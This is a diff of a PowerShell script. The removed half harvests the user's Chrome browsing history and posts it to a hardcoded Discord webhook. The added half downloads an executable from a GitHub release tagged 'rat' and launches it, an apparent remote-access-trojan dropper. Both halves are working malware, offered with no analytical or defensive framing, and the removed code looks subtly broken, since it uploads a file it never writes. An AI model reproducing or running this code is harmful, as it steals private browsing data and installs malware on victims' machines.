@@ -1,27 +1,2 @@
-function Get-ChromeHistory {
-    $Path = "$Env:SystemDrive\Users\$Env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\History"
-    if (-not (Test-Path -Path $Path)) {
-        Write-Verbose "[!] Could not find Chrome History for username: $UserName"
-        return
-    }
-
-    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} | Sort -Unique
-
-    $Content = $Value -join "`r`n"
-
-    $WebhookUrl = "https://discord.com/api/webhooks/1211178896670728272/8fz3rFi0AmlN3f-daDykIzcOruj1UkOrgQDQ8soVQXI3XLzjJWsBAewBqgiBbB0s3DKS"
-    $FileName = "ChromeHistory.txt"
-
-    $FormData = @{
-        file = [System.IO.File]::ReadAllBytes($FileName) -as [System.IO.MemoryStream]
-    }
-
-    $Headers = @{
-        'Content-Disposition' = "form-data; name='file'; filename='$FileName'",
-    }
-
-    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $Headers -Body $FormData -ContentType 'multipart/form-data'
-}
-
-Get-ChromeHistory
+(New-Object System.Net.WebClient).DownloadFile('https://github.com/epiclyrizzy/flippy/releases/download/rat/wd.exe', "$env:USERPROFILE\Downloads\file.exe")
+Start-Process "$env:USERPROFILE\Downloads\file.exe"
